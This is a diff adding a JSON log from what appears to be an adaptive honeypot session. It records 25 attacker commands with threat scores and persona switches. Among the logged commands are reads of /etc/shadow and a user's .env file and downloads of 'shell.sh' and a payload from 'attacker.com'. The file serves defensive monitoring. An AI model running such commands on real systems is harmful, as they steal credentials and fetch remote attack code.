@@ -1,0 +1,301 @@
+{
+  "session_id": "6e929ca8f1ac",
+  "attacker_ip": "185.220.101.42",
+  "persona_transitions": [
+    {
+      "at_command": 16,
+      "from": "generic_linux",
+      "to": "dev_workstation",
+      "trigger_score": 55
+    },
+    {
+      "at_command": 21,
+      "from": "dev_workstation",
+      "to": "finance_server",
+      "trigger_score": 100
+    }
+  ],
+  "commands": [
+    {
+      "index": 1,
+      "command": "whoami",
+      "score": 1,
+      "score_delta": 1,
+      "level": "low",
+      "category": "reconnaissance",
+      "persona": "generic_linux",
+      "source": "fast_path",
+      "response_length": 6
+    },
+    {
+      "index": 2,
+      "command": "id",
+      "score": 2,
+      "score_delta": 1,
+      "level": "low",
+      "category": "reconnaissance",
+      "persona": "generic_linux",
+      "source": "fast_path",
+      "response_length": 69
+    },
+    {
+      "index": 3,
+      "command": "uname -a",
+      "score": 5,
+      "score_delta": 3,
+      "level": "low",
+      "category": "reconnaissance",
+      "persona": "generic_linux",
+      "source": "fast_path",
+      "response_length": 58
+    },
+    {
+      "index": 4,
+      "command": "hostname",
+      "score": 6,
+      "score_delta": 1,
+      "level": "low",
+      "category": "reconnaissance",
+      "persona": "generic_linux",
+      "source": "fast_path",
+      "response_length": 10
+    },
+    {
+      "index": 5,
+      "command": "uptime",
+      "score": 6,
+      "score_delta": 0,
+      "level": "low",
+      "category": "benign",
+      "persona": "generic_linux",
+      "source": "fast_path",
+      "response_length": 69
+    },
+    {
+      "index": 6,
+      "command": "pwd",
+      "score": 6,
+      "score_delta": 0,
+      "level": "low",
+      "category": "benign",
+      "persona": "generic_linux",
+      "source": "fast_path",
+      "response_length": 12
+    },
+    {
+      "index": 7,
+      "command": "ls",
+      "score": 6,
+      "score_delta": 0,
+      "level": "low",
+      "category": "benign",
+      "persona": "generic_linux",
+      "source": "fast_path",
+      "response_length": 0
+    },
+    {
+      "index": 8,
+      "command": "ls -la",
+      "score": 6,
+      "score_delta": 0,
+      "level": "low",
+      "category": "benign",
+      "persona": "generic_linux",
+      "source": "fast_path",
+      "response_length": 314
+    },
+    {
+      "index": 9,
+      "command": "cat /etc/passwd",
+      "score": 12,
+      "score_delta": 6,
+      "level": "low",
+      "category": "exploration",
+      "persona": "generic_linux",
+      "source": "fast_path",
+      "response_length": 574
+    },
+    {
+      "index": 10,
+      "command": "ps aux",
+      "score": 24,
+      "score_delta": 12,
+      "level": "medium",
+      "category": "exploration",
+      "persona": "generic_linux",
+      "source": "fast_path",
+      "response_length": 755
+    },
+    {
+      "index": 11,
+      "command": "netstat -tlnp",
+      "score": 28,
+      "score_delta": 4,
+      "level": "medium",
+      "category": "reconnaissance",
+      "persona": "generic_linux",
+      "source": "fast_path",
+      "response_length": 503
+    },
+    {
+      "index": 12,
+      "command": "env",
+      "score": 31,
+      "score_delta": 3,
+      "level": "medium",
+      "category": "reconnaissance",
+      "persona": "generic_linux",
+      "source": "fast_path",
+      "response_length": 171
+    },
+    {
+      "index": 13,
+      "command": "cat /etc/hosts",
+      "score": 35,
+      "score_delta": 4,
+      "level": "medium",
+      "category": "exploration",
+      "persona": "generic_linux",
+      "source": "fast_path",
+      "response_length": 126
+    },
+    {
+      "index": 14,
+      "command": "ls -la /home",
+      "score": 39,
+      "score_delta": 4,
+      "level": "medium",
+      "category": "exploration",
+      "persona": "generic_linux",
+      "source": "fast_path",
+      "response_length": 182
+    },
+    {
+      "index": 15,
+      "command": "find / -name '*.conf' -maxdepth 3",
+      "score": 45,
+      "score_delta": 6,
+      "level": "medium",
+      "category": "exploration",
+      "persona": "generic_linux",
+      "source": "fast_path",
+      "response_length": 0
+    },
+    {
+      "index": 16,
+      "command": "sudo -l",
+      "score": 55,
+      "score_delta": 10,
+      "level": "high",
+      "category": "privilege_escalation",
+      "persona": "dev_workstation",
+      "source": "fast_path",
+      "response_length": 190
+    },
+    {
+      "index": 17,
+      "command": "cat /etc/shadow",
+      "score": 100,
+      "score_delta": 47,
+      "level": "critical",
+      "category": "privilege_escalation",
+      "persona": "dev_workstation",
+      "source": "fast_path",
+      "response_length": 391
+    },
+    {
+      "index": 18,
+      "command": "cat /etc/sudoers",
+      "score": 100,
+      "score_delta": 20,
+      "level": "critical",
+      "category": "privilege_escalation",
+      "persona": "dev_workstation",
+      "source": "fast_path",
+      "response_length": 44
+    },
+    {
+      "index": 19,
+      "command": "find / -perm -4000",
+      "score": 100,
+      "score_delta": 20,
+      "level": "critical",
+      "category": "privilege_escalation",
+      "persona": "dev_workstation",
+      "source": "fast_path",
+      "response_length": 367
+    },
+    {
+      "index": 20,
+      "command": "wget http://10.0.0.1/shell.sh",
+      "score": 100,
+      "score_delta": 15,
+      "level": "critical",
+      "category": "exfiltration",
+      "persona": "dev_workstation",
+      "source": "fast_path",
+      "response_length": 405
+    },
+    {
+      "index": 21,
+      "command": "curl http://attacker.com/payload",
+      "score": 100,
+      "score_delta": 15,
+      "level": "critical",
+      "category": "exfiltration",
+      "persona": "finance_server",
+      "source": "fast_path",
+      "response_length": 88
+    },
+    {
+      "index": 22,
+      "command": "ls /home",
+      "score": 100,
+      "score_delta": 0,
+      "level": "critical",
+      "category": "benign",
+      "persona": "finance_server",
+      "source": "fast_path",
+      "response_length": 16
+    },
+    {
+      "index": 23,
+      "command": "cat /home/john.dev/.env",
+      "score": 100,
+      "score_delta": 6,
+      "level": "critical",
+      "category": "benign",
+      "persona": "finance_server",
+      "source": "fast_path",
+      "response_length": 51
+    },
+    {
+      "index": 24,
+      "command": "ps aux",
+      "score": 100,
+      "score_delta": 4,
+      "level": "critical",
+      "category": "exploration",
+      "persona": "finance_server",
+      "source": "fast_path",
+      "response_length": 1093
+    },
+    {
+      "index": 25,
+      "command": "ls -la /home/finapp",
+      "score": 100,
+      "score_delta": 4,
+      "level": "critical",
+      "category": "exploration",
+      "persona": "finance_server",
+      "source": "fast_path",
+      "response_length": 131
+    }
+  ],
+  "start_time": "2026-04-22T20:53:46.277579+00:00",
+  "end_time": "2026-04-22T20:53:47.538195+00:00",
+  "final_score": 100,
+  "final_level": "critical",
+  "final_persona": "finance_server",
+  "total_commands": 25
+}
